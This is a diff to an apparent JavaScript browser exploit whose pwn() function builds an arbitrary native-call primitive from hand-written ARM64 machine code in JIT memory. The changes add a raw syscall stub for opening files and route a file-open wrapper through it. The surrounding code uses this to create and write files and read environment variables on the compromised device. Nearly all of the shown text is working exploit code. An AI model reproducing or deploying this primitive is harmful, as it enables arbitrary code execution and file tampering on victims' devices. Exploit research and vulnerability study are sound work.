@@ -256,6 +256,7 @@ function pwn() {
     }
     
     let arbCallBytes = new Uint8Array([
+        // arbCall internal function
         0x00, 0x00, 0x00, 0x10, // adr x0, #0
         0x11, 0x24, 0x40, 0xF9, // ldr x17, [x0, #0x48]
         0x35, 0x02, 0x40, 0xF9, // ldr x21, [x17]
@@ -277,7 +278,12 @@ function pwn() {
         
         // arbCallContext address here
         0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00
+        0x00, 0x00, 0x00, 0x00,
+        
+        // open
+        0xB0, 0x00, 0x80, 0xD2, // mov x16, #5
+        0x01, 0x00, 0x00, 0xD4, // svc #0
+        0xC0, 0x03, 0x5F, 0xD6  // ret
     ]);
     
     // initialize arbitrary call primitive
@@ -381,8 +387,8 @@ function pwn() {
     }
     
     // open wrapper function
-    function open(path, flags) {
-        return arbCall("open", path, flags);
+    function open(path, flags, mode) {
+        return arbCall(JITCode + 0x50, path, flags, mode);
     }
     
     // write wrapper function
@@ -401,7 +407,7 @@ function pwn() {
     const O_CREAT = 0x00000200;
     const O_TRUNC = 0x00000400;
     
-    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
+    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC, 0644);
     // check if it failed
     if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
         log("[+] Failed to open file!");
@@ -423,4 +429,7 @@ function pwn() {
     
     stdoutLog("Hello, World!");
     stdoutLog(`[+] HOME: ${getenv("HOME")}`);
+    
+    // sleep test
+    // arbCall("sleep", 5);
 }
